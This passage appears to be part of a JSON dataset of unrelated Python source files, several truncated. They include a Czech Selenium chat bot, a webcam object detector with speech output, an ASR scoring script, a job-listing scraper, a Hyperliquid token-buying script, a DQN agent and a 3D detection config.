'grid_test'\nsave_path = f\"{save_folder}/grid_{timestamp}.png\"\n\n# Ensure the folder exists\nif not os.path.exists(save_folder):\n    os.makedirs(save_folder)\n\n# Save the grid\nprint(\"Saving images grid...\")\ngrid.save(save_path)\nprint(f\"Images grid saved to {save_path}\")",
    "from dotenv import load_dotenv # Funkce, kter\u00e1 na\u010dte \u00fadaje ze souboru .env do environmentu (prost\u0159ed\u00ed)\r\nimport selenium # Knihovna, kter\u00e1 podporuje pr\u00e1ci s weby\r\nimport selenium.webdriver # Podknihovna od knihovny selenium, kter\u00e1 dovoluje pou\u017e\u00edt prohl\u00ed\u017ee\u010d Chrome\r\nfrom selenium.webdriver.common.by import By # Podknihovna od knihovny selenium, kter\u00e1 dovoluje vyhled\u00e1vat HTML elementy\r\nimport datetime # Knihovna, kter\u00e1 umo\u017e\u0148uje pr\u00e1ci s \u010dasem\r\nimport os # Syst\u00e9mov\u00e1 knihovna\r\n\r\n\r\nload_dotenv() # Na\u010dte \u00fadaje ze souboru .env do environmentu (prost\u0159ed\u00ed)\r\n\r\n\"\"\"\r\nos.environ[\"JMENO_ROBOTA\"] - Na\u010dte hodnotu konstanty JMENO_ROBOTA z environmentu (prost\u0159ed\u00ed)\r\n\r\nPokud je v .env definov\u00e1no JMENO_ROBOTA jako:\r\nJMENO_ROBOTA=\"Pepa\"\r\n\r\ntak os.environ[\"JMENO_ROBOTA\"] vr\u00e1t\u00ed string Pepa.\r\n\"\"\"\r\n\r\n# Deklarujeme konstanty v programu z \u00fadaj\u016f v environmentu (prost\u0159ed\u00ed), kter\u00e9 na\u010detla p\u0159edchoz\u00ed funkce\r\nJMENO_ROBOTA = os.environ[\"JMENO_ROBOTA\"]\r\nHESLO_ROBOTA = os.environ[\"HESLO_ROBOTA\"]\r\nSTUL = os.environ[\"STUL\"]\r\n\r\n# Deklarujeme prohl\u00ed\u017ee\u010d\r\nwhile True: # Smy\u010dka pro dialog u\u017eivatele\r\n    odpoved = input(\"Spustit okno prohl\u00ed\u017ee\u010de (1), nebo spustit pouze v konzoli (2)? (vyber \u010dislo 1 nebo 2): \").strip() # .strip() odebere p\u0159\u00edpadn\u00e9 mezery\r\n    if odpoved == \"1\": # Chceme\r\n        prohlizec = selenium.webdriver.Chrome() # V tomto p\u0159\u00edpad\u011b prohl\u00ed\u017ee\u010d Chrome (Chromium) - nepot\u0159ebujeme nastaven\u00ed, proto\u017ee \u017e\u00e1dn\u00e9 speci\u00e1ln\u00ed nevyu\u017e\u00edv\u00e1me.\r\n        break\r\n    elif odpoved == \"2\": # Nechceme\r\n        nastaveni_prohlizece = selenium.webdriver.chrome.options.Options() # Inicializuje nastaven\u00ed prohl\u00ed\u017ee\u010de Chrome (Chromium)\r\n        nastaveni_prohlizece.add_argument(\"--headless\") # P\u0159id\u00e1 argument headless = okno prohl\u00ed\u017ee\u010de se neotev\u0159e, pob\u011b\u017e\u00ed pouze v konzoli\r\n        prohlizec = selenium.webdriver.Chrome(options=nastaveni_prohlizece) # V tomto p\u0159\u00edpad\u011b prohl\u00ed\u017ee\u010d Chrome (Chromium) s na\u0161\u00edm nastaven\u00edm\r\n        break\r\n    else:\r\n        print(\"Neplatn\u00e1 volba!\")\r\n\r\nprohlizec.set_page_load_timeout(30) # Nastav\u00ed \u010das, jak dlouho bude prohl\u00ed\u017ee\u010d \u010dekat na na\u010dten\u00ed str\u00e1nky p\u0159ed t\u00edm, ne\u017e zahl\u00e1s\u00ed chybu. 30 = 30 sekund.\r\nprohlizec.implicitly_wait(20)# Nastav\u00ed \u010das, jak dlouho bude prohl\u00ed\u017ee\u010d \u010dekat na nalezen\u00ed n\u011bjak\u00e9ho HTML elementu p\u0159ed t\u00edm, ne\u017e zahl\u00e1s\u00ed chybu. 20 = 20 sekund.\r\n\r\n# Nastav\u00edme vypisovat_info na True nebo False podle toho, jestli chceme vypisovat info nebo ne.\r\nwhile True: # Smy\u010dka pro dialog u\u017eivatele\r\n    odpoved = input(\"Chcete vypisovat informace do konzole? (napi\u0161 A pro ano nebo N pro ne): \").strip().upper() # .strip() odebere p\u0159\u00edpadn\u00e9 mezery a .upper() p\u0159evede text do velk\u00fdch p\u00edsmen\r\n    if odpoved == \"A\" or odpoved == \"T\": # Chceme\r\n        vypisovat_info = True\r\n        break\r\n    elif odpoved == \"N\" or odpoved == \"F\": # Nechceme\r\n        vypisovat_info = False\r\n        break\r\n    else:\r\n        print(\"Neplatn\u00e1 volba!\")\r\n\r\n# Deklarace glob\u00e1ln\u00edch prom\u011bnn\u00fdch\r\ncas_posledni_zpravy = datetime.datetime.strptime(datetime.datetime.now().strftime(\"%H:%M:%S\"), \"%H:%M:%S\") # Nastav\u00ed \u010das posledn\u00ed zpr\u00e1vy na aktu\u00e1ln\u00ed \u010das ve form\u00e1tu H:M:S (Al\u00edk pou\u017e\u00edv\u00e1 H:M:S)\r\n\r\ndef vypsat(info):\r\n    \"\"\"Funkce, kter\u00e1 vyp\u00ed\u0161e info do konzole jen pokud si to u\u017eivatel vybral\"\"\"\r\n    global vypisovat_info # Pou\u017eije glob\u00e1ln\u00ed prom\u011bnnou\r\n    if vypisovat_info:\r\n        print(info)\r\n\r\ndef prihlasit():\r\n    \"\"\"Funkce, ve kter\u00e9 se robot p\u0159ihl\u00e1s\u00ed pomoc\u00ed prohl\u00ed\u017ee\u010de na Al\u00edk.cz za pou\u017eit\u00ed jm\u00e9na a hesla. Pot\u00e9 si p\u0159isedne ke stolu.\"\"\"\r\n\r\n    vypsat(\"P\u0159ihla\u0161ov\u00e1n\u00ed...\")\r\n    \r\n    prohlizec.get(\"https://www.alik.cz/prihlasit\") # P\u0159esm\u011bruje se na str\u00e1nku p\u0159ihl\u00e1\u0161en\u00ed\r\n\r\n    prihlasovaci_pole_jmeno = prohlizec.find_element(By.CSS_SELECTOR, '#login') # Najde na str\u00e1nce p\u0159ihla\u0161ovac\u00ed pole pro zad\u00e1n\u00ed u\u017eivatelsk\u00e9ho jm\u00e9na d\u00edky CSS selectoru '#login'\r\n    prihlasovaci_pole_jmeno.send_keys(JMENO_ROBOTA) # Nap\u00ed\u0161e hodnotu ulo\u017eenou v konstant\u011b JMENO_ROBOTA do p\u0159ihla\u0161ovac\u00edho pole\r\n\r\n    prihlasovaci_pole_heslo = prohlizec.find_element(By.CSS_SELECTOR, '#heslo') # Najde p\u0159ihla\u0161ovac\u00ed pole pro zad\u00e1n\u00ed u\u017eivatelsk\u00e9ho hesla\r\n    prihlasovaci_pole_heslo.send_keys(HESLO_ROBOTA) # Nap\u00ed\u0161e hodnotu ulo\u017eenou v konstant\u011b HESLO_ROBOTA do p\u0159ihla\u0161ovac\u00edho pole\r\n\r\n    tlacitko_prihlaseni = prohlizec.find_element(By.CSS_SELECTOR, '.tlacitko') # Najde tla\u010d\u00edtko na p\u0159ihl\u00e1\u0161en\u00ed\r\n    tlacitko_prihlaseni.click() # Klikne na tla\u010d\u00edtko\r\n\r\n    prohlizec.get(STUL) # P\u0159esm\u011bruje prohl\u00ed\u017ee\u010d na URL stolu - robot je ji\u017e p\u0159ihl\u00e1\u0161en\u00fd, tak\u017ee si ke stolu p\u0159isedne.\r\n    vypsat(\"P\u0159ihl\u00e1\u0161eno!\")\r\n\r\n    ahoj = \"Ahoj! \u00dasp\u011b\u0161n\u011b p\u0159ipojeno :D\"\r\n    odeslat_odpoved(ahoj)\r\n\r\ndef ziskat_zpravy():\r\n    \"\"\"\r\n    Na\u010dte nov\u00e9 nezpracovan\u00e9 zpr\u00e1vy z chatu\r\n    \"\"\"\r\n\r\n    global cas_posledni_zpravy # Pou\u017eije glob\u00e1ln\u00ed prom\u011bnnou\r\n\r\n    zpravy = prohlizec.find_elements(By.CSS_SELECTOR, \"#chatOkno > p.c-1\") # Najde v\u0161echny elementy zpr\u00e1v\r\n    pole_zprav = []\r\n    novy_cas = None\r\n\r\n    for zprava in zpravy:\r\n        element_casu_zpravy = zprava.find_element(By.CSS_SELECTOR, \"span.time\") # Najde \u010das zpr\u00e1vy\r\n        text_casu_zpravy = element_casu_zpravy.text.strip() # Z elementu dostane text zp",
    "import warnings\nwarnings.filterwarnings(\"ignore\")\n\nimport cv2\nfrom transformers import AutoImageProcessor, AutoModelForObjectDetection, VitsModel, AutoTokenizer\nimport torch\nimport gradio as gr\nimport threading\nimport time\nimport sounddevice as sd\nimport numpy as np\n\n# Load object detection model and processor from local directory\nsave_directory = \"./local_model\"\nprocessor = AutoImageProcessor.from_pretrained(save_directory)\nmodel = AutoModelForObjectDetection.from_pretrained(save_directory)\n\n# Load the TTS model and tokenizer from the local directory\ntts_model_path = \"./mms-tts-eng/model\"\ntts_model = VitsModel.from_pretrained(tts_model_path)\ntts_tokenizer = AutoTokenizer.from_pretrained(tts_model_path)\n\nstop_event = threading.Event()\nframe = None\n\ndef live_camera_feed(camera_index):\n    global frame\n    cap = cv2.VideoCapture(camera_index)\n    cap.set(3, 640)\n    cap.set(4, 480)\n\n    while not stop_event.is_set():\n        success, img = cap.read()\n        if success:\n            frame = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)  # Convert BGR to RGB\n\n    cap.release()\n\ndef detect_objects():\n    global frame\n    while not stop_event.is_set():\n        if frame is not None:\n            img = frame.copy()\n            inputs = processor(images=img, return_tensors=\"pt\")\n            outputs = model(**inputs)\n            target_sizes = torch.tensor([img.shape[:2]])\n            results = processor.post_process_object_detection(outputs, target_sizes=target_sizes)[0]\n\n            detected_objects = []\n\n            for score, label, box in zip(results[\"scores\"], results[\"labels\"], results[\"boxes\"]):\n                if score > 0.5 and len(detected_objects) < 2:  # Only consider detections with score > 0.5 and limit to 2 objects\n                    box = [int(i) for i in box.tolist()]\n                    label_name = model.config.id2label[label.item()]\n                    cv2.rectangle(img, (box[0], box[1]), (box[2], box[3]), (0, 255, 0), 2)\n                    cv2.putText(img, f\"{label_name} {int(score * 100)}%\", (box[0], box[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)\n                    detected_objects.append(f\"{label_name} {int(score * 100)}%\")\n\n            if detected_objects:\n                # Convert detected objects to text and generate speech\n                for obj in detected_objects:\n                    tts_output = text_to_speech(obj)\n                    play_audio(tts_output)\n                    time.sleep(1)  # Delay of 1 second between TTS outputs\n\n            yield img, detected_objects\n\n            # Clear cache and memory\n            del inputs, outputs, results, img\n            torch.cuda.empty_cache()\n            time.sleep(2.5)  # Delay of 2.5 seconds\n\ndef text_to_speech(text):\n    # Tokenize the input text\n    inputs = tts_tokenizer(text, return_tensors=\"pt\")\n\n    # Generate the speech waveform\n    with torch.no_grad():\n        output = tts_model(**inputs).waveform\n\n    return output\n\ndef play_audio(output):\n    # Ensure the audio data has the correct shape and number of channels\n    audio_data = output.squeeze().numpy()\n    if audio_data.ndim == 1:\n        audio_data = np.expand_dims(audio_data, axis=1)\n    sd.play(audio_data, samplerate=22050)\n    sd.wait()  # Wait until the audio is finished playing\n\ndef start_detection(camera_option):\n    stop_event.clear()\n    camera_index = int(camera_option.split()[-1])\n    threading.Thread(target=live_camera_feed, args=(camera_index,)).start()\n    return detect_objects()\n\ndef stop_detection():\n    stop_event.set()\n\ncamera_options = [\"Camera 0\", \"Camera 1\", \"Camera 2\"]\n\nwith gr.Blocks() as iface:\n    gr.Markdown(\"# Object Detection with Webcam and Text-to-Speech\")\n    camera_option = gr.Dropdown(choices=camera_options, label=\"Select Camera\", value=\"Camera 0\")\n    start_button = gr.Button(\"Start Detection\")\n    stop_button = gr.Button(\"Stop Detection\")\n    live_output = gr.Image(type=\"numpy\", label=\"Live Webcam\")\n    detection_output = gr.Textbox(label=\"Detection Results\")\n\n    def update_output(camera_option):\n        for frame, detected_objects in start_detection(camera_option):\n            yield frame, \"\\n\".join(detected_objects)\n\n    start_button.click(update_output, inputs=camera_option, outputs=[live_output, detection_output])\n    stop_button.click(stop_detection)\n\niface.launch(share=True)\n",
    "#!/usr/bin/env python\n\n\"\"\"\nAuthor: Jiawen Kang (jwkang at se.cuhk.edu.hk)\n\nThis script is used to assist permutation invariant scoring, it split \nmulti-talker ASR ref. and hyp. trn files into utterance-wise files.\nEach utterance contains sub-directories for different permutations. \nIn ref.trn, text from different speakers are divided by a '$' sign, e.g.:\n\"A B C D $ E F G\\t(1089-1089-test_clean_2mix_0000)\"\nwhere the possible permutations are \"A B C D $ E F G\" and \"E F G $ A B C D\".\n\nExpected usage:\npython3 splitting_trn.py \\\n    \t\t--ref_utt $ref_utt \\\n    \t\t--hyp $hyp \\\n    \t\t--out_dir $out_dir\n\noutput dir layouts:\n- out_dir:\n    \t- tmp:\n    \t|\t- utt0:\n    \t|\t|\t- permutation0\n    \t|\t|\t|\t- ref.trn\n    \t|\t|\t|\t- hyp.trn\n    \t|\t|\t- permutation1\n    \t|\t|\t|\t...\n    \t|\t- utt1:\n    \t|\t|\t...\n\nNotes:\n1. There will be two possible permutation in 2-speaker case, and 6 in 3-speaker case.\n2. This script uses @click to parse arguments, please install it before running.\n\"\"\"\n\nimport os\nimport click\nimport tqdm\nimport editdistance\n\nfrom itertools import permutations\n\ndef read_trn(trn):\n    with open(trn, 'r') as f:\n        lines = f.readlines()\n    return lines\n\ndef compute_wer(ref, hyp):\n    ref = ref.strip().split(' ')\n    hyp = hyp.strip().split(' ')\n    return editdistance.eval(ref, hyp) / len(ref)\n\n@click.command()\n@click.option('--ref_utt', type=str, default='n/a')\n@click.option('--hyp', type=str, default='n/a')\n@click.option('--out_dir', type=str, default='n/a')\ndef main(ref_utt, hyp, out_dir):\n    # 1. read trn\n    ref_lines = read_trn(ref_utt)\n    hyp_lines = read_trn(hyp)\n    assert len(ref_lines) == len(hyp_lines), \"ref and hyp have different number of lines\"\n\n    # 2. split ref trn\n    best_refs = []\n    best_hyps = []\n    for line_idx, line in tqdm.tqdm(enumerate(ref_lines), mininterval=0.01):\n        utt_name = line.split('(')[-1].split(')')[0]\n        utt_dir = os.path.join(out_dir, 'tmp', utt_name)\n\n        assert not os.path.exists(utt_dir)\n        os.makedirs(utt_dir)\n\n        spkr_list = line.strip().split('\\t')[0].split(' $ ')\n        assert len(spkr_list) == 2 or len(spkr_list) == 3, \"only support 2 or 3 speakers\"\n\n        # find all permutations\n        best_ref = None\n        best_wer = 99\n        for permu_idx, permu in enumerate(permutations(spkr_list)):\n            ref = ' '.join(permu)\n            hyp = hyp_lines[line_idx].strip().split('\\t')[0].replace(' $ ', ' ')\n            wer = compute_wer(ref, hyp)\n\n            if wer <= best_wer:\n                best_wer = wer\n                best_ref = ref\n\n        assert utt_name in hyp_lines[line_idx], \"utterance name mismatch\"\n        best_refs.append(best_ref + '\\t(' + utt_name + ')')\n        best_hyps.append(hyp_lines[line_idx].strip().replace(' $ ', ' '))\n\n    # 3. write best ref and hyp\n    with open(os.path.join(out_dir, 'best_ref.trn'), 'w') as f:\n        f.write('\\n'.join(best_refs))\n    with open(os.path.join(out_dir, 'best_hyp.trn'), 'w') as f:\n        f.write('\\n'.join(best_hyps))\n\n\nif __name__ == '__main__':\n    main()\n",
    "import requests\r\nimport re\r\nimport csv\r\nfrom bs4 import BeautifulSoup\r\nfrom urllib.parse import urlparse\r\nfrom googlesearch import search\r\n\r\n\r\ndef calculate_external_link_percentage(url, page_content):\r\n    \"\"\"\r\n    Calculates the percentage of external links on a webpage.\r\n\r\n    Args:\r\n        url (str): The URL of the webpage.\r\n        page_content (str): The HTML content of the webpage.\r\n\r\n    Returns:\r\n        float: The percentage of external links on the page.\r\n    \"\"\"\r\n    from bs4 import BeautifulSoup\r\n\r\n    # Parse the webpage content with BeautifulSoup\r\n    soup = BeautifulSoup(page_content, 'html.parser')\r\n\r\n    # Get the domain of the current page\r\n    domain = urlparse(url).netloc\r\n\r\n    # Find all anchor tags with href attributes\r\n    links = soup.find_all('a', href=True)\r\n\r\n    # Count the total and external links\r\n    total_links = len(links)\r\n    external_links = 0\r\n\r\n    for link in links:\r\n        href = link['href']\r\n        # Parse the href to check its domain\r\n        parsed_href = urlparse(href)\r\n        # If the link has a different domain, consider it external\r\n        if parsed_href.netloc and parsed_href.netloc != domain:\r\n            external_links += 1\r\n\r\n    # Calculate the percentage of external links\r\n    external_percentage = (external_links / total_links) * 100 if total_links > 0 else 0\r\n\r\n    return external_percentage\r\n\r\ndef get_job_links(query):\r\n    # Perform a Google search\r\n    links = []\r\n    for url in search(query, num_results=500):  # Change num_results as needed\r\n        if \"flexjobs.com\" in url: continue\r\n        if \"totaljobs.com\" in url: continue\r\n        links.append(url)\r\n    return links\r\n\r\ndef is_job_listing(page_content, soup, url):\r\n    \"\"\"\r\n    Checks if the page is likely a job listing or a list of companies.\r\n    This is a heuristic approach based on the number of external links.\r\n    \"\"\"\r\n    # Get the domain of the current page\r\n    domain = urlparse(url).netloc\r\n\r\n    # Check if the URL indicates a forum post (e.g., quora.com, reddit.com)\r\n    if \"quora.com\" in domain or \"reddit.com\" in domain:\r\n        print(f\"Skipping {url}: It's a forum post.\")\r\n        return False\r\n\r\n    # Find all the links on the page\r\n    links = soup.find_all('a', href=True)\r\n\r\n    # Count the number of outgoing (external) links\r\n    external_links = 0\r\n    for link in links:\r\n        href = link['href']\r\n        # Check if the link is an external link\r\n        if urlparse(href).netloc and urlparse(href).netloc != domain:\r\n            external_links += 1\r\n\r\n    # Calculate the percentage of external links\r\n    external_link_percentage = (external_links / len(links)) * 100 if len(links) > 0 else 0\r\n\r\n    # If 50% or more of the links are external, consider it a list of transcription companies\r\n    if external_link_percentage >= 50:\r\n        print(f\"Skipping {url}: It's a list of transcription companies (more than 50% external links).\")\r\n        return False\r\n\r\n    # Otherwise, consider it a job listing\r\n    return True\r\n\r\ndef extract_pay_rate(page_content):\r\n    \"\"\"\r\n    Extracts the pay rate from the page content using regex for 'per audio hour' and 'per audio minute'.\r\n    \"\"\"\r\n    # Define regex patterns for both \"per audio hour\" and \"per audio minute\"\r\n    patterns = [\r\n        r'(\\$\\d+(\\.\\d{1,2})?)\\s*(per\\s*audio\\s*hour)',  # Example: $15 per audio hour\r\n        r'(\\$\\d+(\\.\\d{1,2})?)\\s*(per\\s*audio\\s*minute)',  # Example: $0.25 per audio minute\r\n        r'(\\\u00a3\\d+(\\.\\d{1,2})?)\\s*(per\\s*audio\\s*minute)',  # Example: \u00a315 per audio hour\r\n        r'(\\\u00a3\\d+(\\.\\d{1,2})?)\\s*(per\\s*audio\\s*minute)',  # Example: \u00a30.25 per audio minute\r\n    ]\r\n\r\n    for pattern in patterns:\r\n        match = re.search(pattern, page_content, re.IGNORECASE)\r\n        if match:\r\n            return match.group(1)  # Return the pay rate (the amount matched)\r\n\r\n    return \"Not mentioned\"  # Return this if no pay rate is found\r\n\r\ndef save_to_csv(jobs):\r\n    \"\"\"\r\n    Saves the job details to a CSV file.\r\n    \"\"\"\r\n    # Define the CSV file fieldnames\r\n    fieldnames = ['Job Title', 'URL', 'Pay Rate', 'Description']\r\n    filename = 'transcription_jobs.csv'\r\n\r\n    try:\r\n        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:\r\n            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\r\n            writer.writeheader()  # Write the header row\r\n\r\n            # Write each job to the CSV file\r\n            for job in jobs:\r\n                # Use `.get()` to handle missing keys and avoid KeyError\r\n                writer.writerow({\r\n                    'Job Title': job.get('Job Title', 'No Title Found'),\r\n                    'URL': job.get('URL', ''),\r\n                    'Pay Rate': job.get('Pay Rate', 'Not mentioned'),\r\n                    'Description': job.get('Description', 'Not available'),\r\n                })\r\n\r\n        print(f\"Jobs successfully saved to {filename}\")\r\n    except Exception as e:\r\n        print(f\"Error while saving to CSV: {e}\")\r\n\r\ndef get_job_info(url):\r\n    try:\r\n    ",
    "import json\n\nimport utils\nimport ascii\n\nfrom hyperliquid.utils import constants\n\n\ndef main():\n    # Setup the environment and get the user's address, info, and exchange object\n    address, info, exchange = utils.setup(constants.MAINNET_API_URL, skip_ws=True)\n\n    #############################################################\n    mcap_filter = \"500000\"     # Minimum market cap filter\n    vol_filter = \"\"            # Minimum 24h volume filter\n    # Use only one of the filters.\n    #############################################################\n    buy_amount = \"10\"  # Amount in USDC to spend per token\n    # Amount must be over $10!\n    #############################################################\n\n    # Retrieve the user's current spot account state\n    spot_user_state = info.spot_user_state(address)\n    # Extract the available USDC balance from the user's account\n    usdc_balance = next((balance['total'] for balance in spot_user_state['balances'] if balance['coin'] == 'USDC'), None)\n    print(f\"Available USDC balance: {usdc_balance}\")\n\n    # Retrieve metadata and asset contexts for spot tokens\n    spot_tokens = exchange.info.spot_meta_and_asset_ctxs()\n\n    # Create a mapping from token index to token name\n    index_to_name = {token['index']: token['name'] for token in spot_tokens[0]['tokens']}\n\n    # Create a mapping from token index to token details\n    index_to_details = {token['index']: token for token in spot_tokens[0]['tokens']}\n\n    # Create a mapping from token name to detailed information\n    token_info_map = {}\n    universe = spot_tokens[0]['universe']\n    market_data = spot_tokens[1]\n\n    # Iterate over market data to populate token information map\n    for market in market_data:\n        token_name = market['coin']\n        universe_entry = None\n\n        if token_name.startswith('@'):\n            # Find the corresponding universe entry for tokens with '@' prefix\n            universe_entry = next((entry for entry in universe if entry['name'] == token_name), None)\n            if universe_entry:\n                # Use the first token index to find the actual token name\n                token_index = universe_entry['tokens'][0]\n                token_name = index_to_name.get(token_index, token_name)\n\n        # Get token details using the index\n        token_index = universe_entry['tokens'][0] if universe_entry else None\n        token_details = index_to_details.get(token_index, {})\n\n        # Populate the map with detailed information about the token\n        token_info_map[token_name] = {\n            \"id\": market['coin'],\n            \"24h_vol\": round(float(market['dayNtlVlm']), 2),\n            \"price\": market['markPx'],\n            \"mcap\": round(float(market['markPx']) * float(market['circulatingSupply']), 2),\n            \"szDecimals\": token_details.get('szDecimals'),\n            \"weiDecimals\": token_details.get('weiDecimals')\n        }\n\n    # Manual adjustment for specific token \"PURR/USDC\"\n    if \"PURR/USDC\" in token_info_map:\n        token_info_map[\"PURR\"] = token_info_map.pop(\"PURR/USDC\")\n        token_info_map[\"PURR\"][\"id\"] = \"PURR\"\n        token_info_map[\"PURR\"][\"szDecimals\"] = 0\n        token_info_map[\"PURR\"][\"weiDecimals\"] = 5\n\n    # Filter out tokens with '@' in their name (failsafe)\n    token_info_map = {name: info for name, info in token_info_map.items() if '@' not in name}\n\n    # Initialize a dictionary to hold filtered tokens based on criteria\n    filtered_tokens = {}\n\n    # Apply market cap filter if specified\n    if mcap_filter and not vol_filter:\n        filtered_tokens = {name: info['price'] for name, info in token_info_map.items() if info['mcap'] >= float(mcap_filter)}\n    # Apply volume filter if specified\n    elif vol_filter and not mcap_filter:\n        filtered_tokens = {name: info['price'] for name, info in token_info_map.items() if info['24h_vol'] >= float(vol_filter)}\n\n    # Calculate the total cost of buying the filtered tokens\n    total_cost = len(filtered_tokens) * float(buy_amount)\n    if total_cost > float(usdc_balance):\n        print(f\"Your USDC balance must be at least {total_cost} to proceed.\")\n        # return\n\n    # Create a new map for the amount we can buy per token\n    buy_map = {}\n    for token_name, price in filtered_tokens.items():\n        # Calculate the raw buy amount\n        raw_buy_amount = float(buy_amount) / float(price)\n        \n        # Get the szDecimals for the token\n        sz_decimals = token_info_map[token_name].get('szDecimals', 0)\n        \n        # Round the buy amount according to szDecimals\n        buy_map[token_name] = round(raw_buy_amount, sz_decimals)\n\n    # Display the buy map and total cost to the user\n    print(buy_map)\n    print(f\"Following tokens will be bought at a total cost of {total_cost}.\\n\")\n\n    # Prompt the user for confirmation to proceed with the purchase\n    user_input = input(\"Do you want to proceed? (Y/N): \").strip().upper()\n    if user_input not in ['Y', 'y']:\n        print(\"Operation cancelled by the user.\")\n        return\n\n    # ",
    "import torch\nimport random\nimport numpy as np\nfrom collections import deque\nfrom neural import AgentNet, MODEL_FLAG_ONLINE, MODEL_FLAG_TARGET\n\nclass Agent:\n    def __init__(self, state_dim, action_dim, save_dir, checkpoint=None, epsilon=1.0):\n        my_rig_factor = 0.9\n        self.state_dim = state_dim\n        self.action_dim = action_dim\n        self.memory = deque(maxlen=int(100_000 * my_rig_factor))\n        self.batch_size = 32\n\n        self.exploration_rate = epsilon\n        self.exploration_rate_decay = 0.99999975\n        self.exploration_rate_min = 0.02\n        self.gamma = 0.99\n\n        self.curr_step = 0\n        self.burnin = int(100_000 * my_rig_factor)  # min. experiences before training\n        self.learn_every = 3  # no. of experiences between updates to Q_online\n        self.sync_every = 1_000  # no. of experiences between Q_target & Q_online sync (tau)\n\n        self.save_every = 200_000   # no. of experiences between saving Agent Net\n        self.save_dir = save_dir\n\n        self.use_cuda = torch.cuda.is_available()\n        self.use_mps_device = torch.backends.mps.is_available()\n        if self.use_cuda:\n            self.device = 'cuda'\n        elif self.use_mps_device:\n            self.device = 'mps:0'\n        else:\n            self.device = 'cpu'\n        torch.device(self.device)\n        torch.set_default_device(self.device)\n        print(f\"Using device: {torch.get_default_device()}\")\n\n        # Script the network and use it directly\n        self.net = torch.jit.script(AgentNet((4, 84, 84), action_dim))\n        self.net = self.net.to(device=self.device)\n        if checkpoint:\n            print(f\"Loading: {checkpoint}\")\n            self.load(checkpoint)\n\n        self.learning_rate = 0.00025\n        self.optimizer = torch.optim.Adam(self.net.parameters(), lr=self.learning_rate)\n        self.loss_fn = torch.nn.SmoothL1Loss()\n\n    def act(self, state):\n        \"\"\"\n        Given a state, choose an epsilon-greedy action and update value of step.\n\n        Inputs:\n        state: A single observation of the current state, dimension is (state_dim)\n        Outputs:\n        action_idx (int): An integer representing which action Agent will perform\n        \"\"\"\n        # EXPLORE\n        if np.random.rand() < self.exploration_rate:\n            action_idx = np.random.randint(self.action_dim)\n\n        # EXPLOIT\n        else:\n            state = torch.tensor(state, dtype=torch.float, device=self.device)\n            state = state.unsqueeze(0)\n            action_values = self.net(state, MODEL_FLAG_ONLINE)  # Use 0 for 'online'\n            action_idx = torch.argmax(action_values, axis=1).item()\n\n        # decrease exploration_rate\n        self.exploration_rate *= self.exploration_rate_decay\n        self.exploration_rate = max(self.exploration_rate_min, self.exploration_rate)\n\n        # increment step\n        self.curr_step += 1\n        return action_idx\n\n    def cache(self, state, next_state, action, reward, done):\n        \"\"\"\n        Store the experience to self.memory (replay buffer)\n\n        Inputs:\n        state,\n        next_state,\n        action (int),\n        reward (float),\n        done (bool)\n        \"\"\"\n\n        state = torch.tensor(state, dtype=torch.float, device=self.device)\n        next_state = torch.tensor(next_state, dtype=torch.float, device=self.device)\n        action = torch.tensor([action], dtype=torch.long, device=self.device)\n        reward = torch.tensor([reward], dtype=torch.float, device=self.device)\n        done = torch.tensor([done], dtype=torch.bool, device=self.device)\n\n        self.memory.append((state, next_state, action, reward, done))\n\n    def recall(self):\n        \"\"\"\n        Retrieve a batch of experiences from memory\n        \"\"\"\n        batch = random.sample(self.memory, self.batch_size)\n        state, next_state, action, reward, done = map(torch.stack, zip(*batch))\n        return state, next_state, action.squeeze(), reward.squeeze(), done.squeeze()\n\n    def td_estimate(self, state, action):\n        current_Q = self.net(state, MODEL_FLAG_ONLINE)[np.arange(0, self.batch_size), action]  # Use 0 for 'online'\n        return current_Q\n\n    @torch.no_grad()\n    def td_target(self, reward, next_state, done):\n        next_state_Q_online = self.net(next_state, MODEL_FLAG_ONLINE)  # Use 0 for 'online'\n        best_action = torch.argmax(next_state_Q_online, axis=1)\n        next_Q = self.net(next_state, MODEL_FLAG_TARGET)[np.arange(0, self.batch_size), best_action]  # Use 1 for 'target'\n        return (reward + (1 - done.float()) * self.gamma * next_Q).float()\n\n    def update_Q_online(self, td_estimate, td_target):\n        loss = self.loss_fn(td_estimate, td_target)\n        self.optimizer.zero_grad()\n        loss.backward()\n        self.optimizer.step()\n        return loss.item()\n\n    def update_target_network(self):\n        self.net.target.load_state_dict(self.net.online.state_dict())\n\n    def learn(self):\n        if self.curr_step % self.sync_every == 0:\n            self.update_target_",
    "# model settings\nvoxel_size = [0.05, 0.05, 0.1]\npoint_cloud_range = [0, -40, -3, 70.4, 40, 1]\n\nmodel = dict(\n    type='VoxelNet',\n    voxel_layer=dict(\n        max_num_points=5,\n        point_cloud_range=point_cloud_range,\n        voxel_size=voxel_size,\n        max_voxels=(16000, 40000)),\n    voxel_encoder=dict(type='HardSimpleVFE'),\n    middle_encoder=dict(\n        type='SparseEncoder',\n        in_channels=4,\n        sparse_shape=[41, 1600, 1408],\n        order=('conv', 'norm', 'act')),\n    backbone=dict(\n        type='SECOND',\n        in_channels=256,\n        layer_nums=[5, 5],\n        layer_strides=[1, 2],\n        out_channels=[128, 256]),\n    neck=dict(\n        type='SECONDFPN',\n        in_channels=[128, 256],\n        upsample_strides=[1, 2],\n        out_channels=[256, 256]),\n    bbox_head=dict(\n        type='Anchor3DHead',\n        num_classes=3,\n        in_channels=512,\n        feat_channels=512,\n        use_direction_classifier=True,\n        anchor_generator=dict(\n            type='Anchor3DRangeGenerator',\n            ranges=[\n                [0, -40.0, -0.6, 70.4, 40.0, -0.6],\n                [0, -40.0, -0.6, 70.4, 40.0, -0.6],\n                [0, -40.0, -1.78, 70.4, 40.0, -1.78],\n            ],\n            sizes=[[0.8, 0.6, 1.73], [1.76, 0.6, 1.73], [3.9, 1.6, 1.56]],\n            rotations=[0, 1.57],\n            reshape_out=False),\n        diff_rad_by_sin=True,\n        bbox_coder=dict(type='DeltaXYZWLHRBBoxCoder'),\n        loss_cls=dict(\n            type='FocalLoss',\n            use_sigmoid=True,\n            gamma=2.0,\n            alpha=0.25,\n            loss_weight=1.0),\n        loss_bbox=dict(type='SmoothL1Loss', beta=1.0 / 9.0, loss_weight=2.0),\n        loss_dir=dict(\n            type='CrossEntropyLoss', use_sigmoid=False, loss_weight=0.2)),\n    # model training and testing settings\n    train_cfg=dict(\n        assigner=[\n            dict(  # for Pedestrian\n                